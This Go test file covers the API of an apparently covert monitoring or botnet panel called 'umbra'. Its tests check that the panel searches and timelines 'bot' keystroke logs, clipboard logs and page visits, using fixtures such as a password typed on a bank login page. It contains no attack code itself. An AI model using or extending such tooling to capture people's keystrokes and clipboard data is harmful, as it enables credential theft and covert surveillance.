package api

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/db/models"
)

func setupInvestigation(t *testing.T) (*InvestigationAPI, *MediaAPI, *gorm.DB) {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return &InvestigationAPI{DB: g}, &MediaAPI{DB: g}, g
}

func TestClipboardLogs_BotIDFilter(t *testing.T) {
	_, media, gdb := setupInvestigation(t)
	botA := uuid.New()
	botB := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotClipboardLog{BotID: botA, Text: "secret-a", Action: "copy", Timestamp: now})
	gdb.Create(&models.BotClipboardLog{BotID: botB, Text: "secret-b", Action: "paste", Timestamp: now})

	r := httptest.NewRequest(http.MethodGet, "/?id="+botA.String(), nil)
	rr := httptest.NewRecorder()
	media.ClipboardLogs(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	rows := resp.Result.([]any)
	if len(rows) != 1 {
		t.Fatalf("len=%d want 1", len(rows))
	}
}

func TestSearch_FindsKeyboardClipboardAndNav(t *testing.T) {
	inv, _, gdb := setupInvestigation(t)
	bot := models.Bot{Name: "laptop-1", BrowserID: "b1", ProxyPassword: "x"}
	if err := gdb.Create(&bot).Error; err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	gdb.Create(&models.BotKeyboardLog{BotID: bot.ID, URL: "https://bank.example", Keys: "hunter2", Timestamp: now})
	gdb.Create(&models.BotClipboardLog{BotID: bot.ID, URL: "https://chat.example", Text: "rotate hunter2", Action: "copy", Timestamp: now})
	gdb.Create(&models.BotNavEvent{BotID: bot.ID, URL: "https://bank.example/login", Title: "Login", Timestamp: now})

	r := httptest.NewRequest(http.MethodGet, "/?q=hunter2", nil)
	rr := httptest.NewRecorder()
	inv.Search(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	hits := resp.Result.([]any)
	if len(hits) < 2 {
		t.Fatalf("hits=%d want >=2 body=%s", len(hits), rr.Body.String())
	}

	r2 := httptest.NewRequest(http.MethodGet, "/?q=bank.example&kinds=nav", nil)
	rr2 := httptest.NewRecorder()
	inv.Search(rr2, r2)
	var resp2 envelope
	_ = json.Unmarshal(rr2.Body.Bytes(), &resp2)
	navHits := resp2.Result.([]any)
	if len(navHits) != 1 {
		t.Fatalf("nav hits=%d want 1", len(navHits))
	}
}

func TestTimeline_MergesKindsChronologically(t *testing.T) {
	inv, _, gdb := setupInvestigation(t)
	botID := uuid.New()
	t0 := time.Now().Add(-3 * time.Minute)
	t1 := t0.Add(time.Minute)
	t2 := t1.Add(time.Minute)
	gdb.Create(&models.BotNavEvent{BotID: botID, URL: "https://a.example", Timestamp: t0})
	gdb.Create(&models.BotKeyboardLog{BotID: botID, Keys: "hi", Timestamp: t2})
	gdb.Create(&models.BotClipboardLog{BotID: botID, Text: "clip", Action: "copy", Timestamp: t1})

	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String()+"&limit=50", nil)
	rr := httptest.NewRecorder()
	inv.Timeline(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	items := resp.Result.([]any)
	if len(items) != 3 {
		t.Fatalf("len=%d want 3", len(items))
	}
	first := items[0].(map[string]any)
	if first["kind"] != "keyboard" {
		t.Fatalf("first kind=%v want keyboard (newest first)", first["kind"])
	}
}

func TestAlerts_AckAndList(t *testing.T) {
	inv, _, gdb := setupInvestigation(t)
	botID := uuid.New()
	row := models.BotAlert{BotID: botID, Kind: "domain", Severity: "high", Title: "Visited bank.example", URL: "https://bank.example", Timestamp: time.Now()}
	if err := gdb.Create(&row).Error; err != nil {
		t.Fatal(err)
	}

	list := httptest.NewRequest(http.MethodGet, "/?unacked=1", nil)
	listRR := httptest.NewRecorder()
	inv.Alerts(listRR, list)
	if listRR.Code != http.StatusOK {
		t.Fatalf("list status=%d", listRR.Code)
	}

	ack := httptest.NewRequest(http.MethodPost, "/", strings.NewReader(`{}`))
	ack.Header.Set("Content-Type", "application/json")
	ack = ack.WithContext(chiRouteCtx("id", row.ID.String()))
	ackRR := httptest.NewRecorder()
	inv.AckAlert(ackRR, ack)
	if ackRR.Code != http.StatusOK {
		t.Fatalf("ack status=%d body=%s", ackRR.Code, ackRR.Body.String())
	}
	var stored models.BotAlert
	gdb.First(&stored, "id = ?", row.ID)
	if !stored.Acknowledged {
		t.Fatal("alert was not acknowledged")
	}
}
